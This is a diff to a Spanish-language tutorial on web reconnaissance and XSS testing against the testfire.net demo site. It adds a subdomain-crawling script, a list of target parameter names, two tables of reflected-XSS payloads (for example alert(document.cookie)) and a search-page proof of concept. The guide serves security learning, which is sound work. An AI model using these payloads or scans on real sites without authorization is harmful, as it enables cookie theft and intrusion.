@@ -41,7 +41,7 @@ Content-Length: 34
   "key2": "value2"
 }
 ```
->*Recursos: [Requestly](https://requestly.com/blog/modify-headers-in-https-requests-and-responses-in-chrome-firefox-safari/) [Exploit-notes](https://exploit-notes.hdks.org/exploit/web/tool/add-custom-http-headers-in-burp-suite/) [Website for testing header](https://httpbin.org/headers)*
+>*Referencias: [Requestly](https://requestly.com/blog/modify-headers-in-https-requests-and-responses-in-chrome-firefox-safari/) [Exploit-notes](https://exploit-notes.hdks.org/exploit/web/tool/add-custom-http-headers-in-burp-suite/) [Website for testing header](https://httpbin.org/headers)*
 
 
 ## 2. Encontrar subdomains
@@ -56,7 +56,7 @@ cat *_subs.txt | sort -u | anew testfire.net_all_subs.txt
 # Obtener toekn github
 #Fine-grained personal access tokens -> Generate new token
 ```
->*Recurso: [Generate Token](https://github.com/settings/personal-access-tokens/)
+>*Referencias: [Generate Token](https://github.com/settings/personal-access-tokens/)*
 
 ## 3. Web Crawling para encontrar URLs interesantes
 ```bash
@@ -69,6 +69,9 @@ nano run_katana.sh
 chmod +x run_katana.sh
 ./run_katana.sh
 ```
+<details>
+<summary>📜 Ver script Bash completo</summary>
+
 ```bash
 #!/bin/bash
 
@@ -78,14 +81,15 @@ OUTPUT="testfire.net_katana_results.txt"
 # Limpiar salida anterior
 > "$OUTPUT"
 
-# Filtrar solo subdominios válidos y ejecutar katana
-grep -oP '\b(?:[a-z0-9-]+\.)+testfire\.net\b' "$INPUT" | sort -u | while read -r sub; do
+# Filtrar subdominios válidos y ejecutar katana
+grep -oP '(?:[a-zA-Z0-9_-]+\.)+testfire\.net' "$INPUT" | sort -u | while read -r sub; do
     echo "[+] Escaneando: http://$sub"
     katana -u "http://$sub" -silent -jc >> "$OUTPUT"
 done
 
 echo "[+] Finalizado. Resultados en $OUTPUT"
 ```
+</details>
 
 ## 4. Buscar patrones comunes de XSS en URLs
 ```bash
@@ -114,7 +118,34 @@ PARAMS=(
 "keyword"
 "query"
 "page"
-...
+"keywords"
+"year"
+"view"
+"email"
+"type"
+"name"
+"p"
+"callback"
+"jsonp"
+"api_key"
+"api"
+"password"
+"emailto"
+"token"
+"username"
+"csrf_token"
+"unsubscribe_token"
+"id"
+"item"
+"page_id"
+"month"
+"immagine"
+"list_type"
+"url"
+"terms"
+"categoryid"
+"key"
+"l"
 "begindate"
 "enddate"
 )
@@ -129,8 +160,7 @@ echo "[+] Resultados guardados en $OUTPUT_FILE"
 ```
 </details>
 
-
->*Recurso: [Patrones xss](https://github.com/1ndianl33t/Gf-Patterns/blob/master/xss.json)
+>*Referencias: [Patrones xss](https://github.com/1ndianl33t/Gf-Patterns/blob/master/xss.json)*
 
 ## 5. Investigación de candidatos
 ```bash
@@ -141,6 +171,51 @@ https://demo.testfire.net/swagger/err/error-transformers/transformers/not-of-typ
 https://demo.testfire.net/swagger/download-url.js
 ```
 
->*Recurso: [Payload xss comunes](https://github.com/payloadbox/xss-payload-list)
+<details>
+<summary>📜 Top payloads para testing</summary>
+
+| Nº  | Payload                                             | Descripción                                                                 |
+|-----|-----------------------------------------------------|------------------------------------------------------------------------------|
+| 1  | `<script>alert(1)</script>`                         | Funciona cuando se inserta en HTML sin sanitizar.                  |
+| 2  | `"><script>alert(1)</script>`                       | Cierra un atributo HTML antes de inyectar el script.                        |
+| 3  | `<img src=x onerror=alert(1)>`                      | Ejecuta código JavaScript al fallar la carga de la imagen.                  |
+| 4  | `<svg onload=alert(1)>`                             | SVG permite eventos como `onload`, útil para bypass en filtros simples.     |
+| 5  | `<iframe src="javascript:alert(1)">`                | Ejecuta código desde el atributo `src`, usando el protocolo `javascript:`.  |
+| 6  | `<body onload=alert(1)>`                            | Si se puede controlar etiquetas HTML, permite ejecutar al cargar el body.   |
+| 7  | `<math><mtext><script>alert(1)</script>`           | Usa etiquetas poco comunes que a veces no son filtradas por WAFs.           |
+| 8  | `<script>confirm(1)</script>`                       | Alternativa a `alert()`, puede evadir detecciones básicas.                  |
+| 9  | `<details open ontoggle=alert(1)>`                  | HTML5: evento `ontoggle` poco filtrado, efectivo en bypass.                 |
+| 10   | `<a href="javascript:alert(1)">Click</a>`           | Si el tag `<a>` es permitido, ejecuta JS al hacer clic.                     |
+
+| Nº  | Payload                                                              | Descripción                                                                 |
+|-----|----------------------------------------------------------------------|------------------------------------------------------------------------------|
+| 1️  | `<script>alert(document.cookie)</script>`                            | Muestra las cookies activas de la sesión.                                   |
+| 2  | `<script>alert(document.domain)</script>`                            | Muestra el dominio actual de ejecución.                                     |
+| 3  | `<script>alert(document.location)</script>`                          | Imprime la URL completa del documento.                                      |
+| 4  | `<script>alert(document.referrer)</script>`                          | Muestra desde qué página se llegó al sitio.                                 |
+| 5  | `<script>alert("Cookie: "+document.cookie)</script>`                | PoC más personalizada mostrando la cookie.                                  |
+| 6  | `<script>alert("URL: "+window.location.href)</script>`              | Muestra la URL completa con más claridad.                                   |
+| 7  | `<script>alert("Dominio: "+location.hostname)</script>`             | Útil para fingerprint o confirmar subdominios.                              |
+| 8  | `<script>alert("Ruta: "+location.pathname)</script>`                | Ruta del recurso dentro del sitio.                                          |
+| 9  | `<script>alert("User-Agent: "+navigator.userAgent)</script>`        | Muestra el navegador/vista del cliente.                                     |
+| 10   | `<script>alert("Cookie: "+document.cookie+"\nRef: "+document.referrer)</script>` | Combina datos clave en un solo pop-up.                            |
+
+</details>
+
+```bash
+# Payload básico para la PoC:
+<script>alert(document.cookie)</script>
+#Url
+https://demo.testfire.net/search.jsp
+```
+> Abrimos la ulr
+![image](https://github.com/user-attachments/assets/8158af39-7bb6-478d-b70d-30124c771260)
+> Testeamos el parámetro reflejado
+![image](https://github.com/user-attachments/assets/7752fc90-2800-4a75-8ec9-ee26f52c385d)
+> Insertamos el payload
+![image](https://github.com/user-attachments/assets/1136a0b4-5fc0-4a46-a3b4-f1703687c70d)
+
+
+>*Referencias: [Payload xss comunes](https://github.com/payloadbox/xss-payload-list)*
 
 
